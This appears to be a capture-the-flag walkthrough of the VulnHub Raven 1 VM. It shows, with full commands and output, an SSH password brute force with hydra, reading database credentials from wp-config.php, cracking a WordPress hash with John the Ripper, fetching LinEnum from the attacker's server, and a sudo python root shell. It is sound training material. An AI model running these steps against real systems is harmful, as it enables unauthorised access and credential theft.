---
layout:     single
classes:    wide
title:      "VulnHub: Raven 1 Walkthrough"
subtitle:   "A walkthrough of the Raven 1 Machine on VulnHub."
date:       2019-03-11 12:00:00
categories: ctf vulnhub
---

* * *
<p>
Writeup for the <a href='https://www.vulnhub.com/entry/raven-1,256/' target="_blank">Raven</a> 
machine from VulnHub. A directory busting scan
reveals a wordpress installation from which we can find two usernames. We can easily bruteforce the
SSH credentials for one of these users using hydra to gain a low privilege shell, which we use
to discover a plaintext password for the MySQL database in the wordpress config file. Exploring
the database reveals another password stored as a Wordpress MD5 hash, which we can crack with JtR.
From there, we can use a python installation running as root to gain a root shell.
</p>
* * *

<p>Starting off with an nmap scan:
<code><a href='https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oA+Raven+10.0.2.5' target="_blank">nmap -sC -sV -oA Raven 10.0.2.5</a></code>
</p>

```
# Nmap 7.70 scan initiated Tue Feb 26 19:37:33 2019 as: nmap -sC -sV -oA Raven 10.0.2.5
Nmap scan report for 10.0.2.5
Host is up (0.00012s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          40013/tcp  status
|_  100024  1          47611/udp  status
```
<p>
You can see that that it's an Apache server running off port 80. Feel free to navigate to it in a web browser
and click around for a bit. In the meantime, we should have some other scans going on in the
background.
</p>

![](/img/raven-00.png)

<p>
Let's start with a directory busting scan. I like gobuster, but feel free to use your tool of choice.
Gobuster scan: <code>gobuster -u 10.0.2.5 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code>
</p>

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.0.2.5/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt                                                                   
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/02/26 19:39:48 Starting gobuster
=====================================================
/img (Status: 301)
/css (Status: 301)
/wordpress (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
=====================================================
```
<p>
We discover a wordpress installation. We can run another directory-busting scan on that directory,
and we could probe a bit more with wpscan: <code>wpscan --url http://10.0.2.5/wordpress -e --wp-content-dir wp-content</code>
</p>

```
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.4.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://10.0.2.5/wordpress/

[...]

[i] User(s) Identified:

[+] michael
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] steven
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

<p>
We gain two wordpress users. We could try to log into wordpress at <code>10.0.2.5/wordpress/wp-login.php</code>,
or try our luck with SSH. I prepared hydra and tried at SSH first, since it will be more valuable if it ends up working. If it doesn't, we'll go ahead with wordpress. Either way, we need to create a text file with our users to feed into hydra. Since there are only 2 users, doing it manually is fine. I put them into a file called users.txt. Here's the command:
<code><a href='https://explainshell.com/explain?cmd=hydra+-L+users.txt+-P+%2Fusr%2Fshare%2Fwordlists%2Frockyou.txt++-e+nsr+-o+hydra.log+-t8+-f+ssh%3A%2F%2F10.0.2.5' target="_blank">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt  -e nsr -o hydra.log -t8 -f ssh://10.0.2.5</a></code>. If you're using Kali, unzip whichever wordlist you decided to use. I just used rockyou. Hydra uses 16 threads by default, so I reduced it to 8. Too many parallel connections can cause errors or disable the service.
</p>

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-03-04 21:08:31
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:2/p:3), ~1 try per task
[DATA] attacking ssh://10.0.2.5:22/
[22][ssh] host: 10.0.2.5   login: michael   password: michael
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-03-04 21:08:32
```
<p>
And with that, we get michael's SSH password and a low privilege shell.
Log in with <code>ssh michael@10.0.2.5</code>. Now we start enumerating again.
Now that we have a shell, let's take a look at the wordpress folder. Specifically, in <code>wp-config.php</code>. On the way there, I stumbled across flag 2, in /var/www/:
<code>flag2{fc3fd58dcdad9ab23faca6e9a36e581c}</code>.
</p>

```
michael@Raven:/var/www/html/wordpress$ cat wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
[...]
```
<p>
We find the credentials to log into the MySQL database. Wordpress requires MySQL or MariaDB to work, so the credentials for either were likely to exist on the machine. Let's try logging in with the password we found.
</p>

```
michael@Raven:/var/www/html/wordpress$ mysql -u root -p wordpress
Enter password: R@v3nSecurity
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 294
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql>
```
<p>
And it worked. We get a prompt. Let's start poking around.
</p>

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)

mysql> use wordpress
Database changed

mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)
```
<p>
<code>wp-users</code> looks interesting.
</p>

```
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
2 rows in set (0.00 sec)
```

<p>
Here's our users again, but we've got some password hashes this time. We still don't have steven's account, so let's try cracking his password. These are MD5 Wordpress hashes:
</p>

![](/img/raven1_wp-hash.png)

<p>
We'll be using JtR for this. First, we need to create a password file: <code>echo steven:P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ > steven.txt</code>. 
</p>

```
root@kali:~/Documents/VulnHub/Raven# john steven.txt --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pink84           (steven)
1g 0:00:00:04 DONE (2019-03-05 22:45) 0.2439g/s 11203p/s 11203c/s 11203C/s remix..magic2
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```

<p>
Cracked in 4 seconds with rockyou. Now we can log into steven's wordpress account...but let's try SSH first. Michael reused his password, so maybe Steven did as well. This whole machine seems to be an exercise in weak credentials anyway.
</p>

```
root@kali:~# ssh steven@192.168.1.18
steven@192.168.1.18's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 13 14:12:04 2018
```

<p>
It worked. Thats another user, so let's start enumerating again. Lets automate it this time with <a href='https://github.com/rebootuser/LinEnum'>LinEnum.sh</a>. On the attacking machine, host the script with <code>python -m SimpleHTTPServer 9999</code>. On the victim machine, grab the file using wget or curl: <code>wget 10.0.2.5:9999/file.txt</code> OR <code>curl -O http://10.0.2.5/file.txt</code>. Here's the important bit:
</p>


```
 ### SYSTEM ##############################################
[-] Kernel information:
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) 
(gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)

[-] Hostname:
Raven

[-] Super user account(s):
root

[+] We can sudo without supplying a password!
Matching Defaults entries for steven on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python

[+] Possible sudo pwnage!
/usr/bin/python
```

<p>
Turns out that steven can run python as root without a password. (We could get this same information with <code>sudo -l</code> while logged in as steven.) Since we can run python as root, and python can spawn a shell, we'll use it to spawn a root shell. Some other common programs that can spawn a shell are nmap, nc, vim, and more. Keep an eye out for these running with root permissions for an easy privesc. I'll use the python interpreter to spawn a shell:
</p>

```
$ sudo python
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("/bin/bash")
root@Raven:/home# whoami
root
```
<p>
And with that, we get a root shell. Navigate to the root directory to grab flag 4 and that's the box. 
</p>

```
root@Raven:/# cd root
root@Raven:~# ls
flag4.txt
root@Raven:~# cat flag4.txt
______                      
| ___ \                     
| |_/ /__ ___   _____ _ __  
|    // _` \ \ / / _ \ '_ \ 
| |\ \ (_| |\ V /  __/ | | |
\_| \_\__,_| \_/ \___|_| |_|

                            
flag4{715dea6c055b9fe3337544932f2941ce}

CONGRATULATIONS on successfully rooting Raven!

This is my first Boot2Root VM - I hope you enjoyed it.

Hit me up on Twitter and let me know what you thought: 

@mccannwj / wjmccann.github.io
```
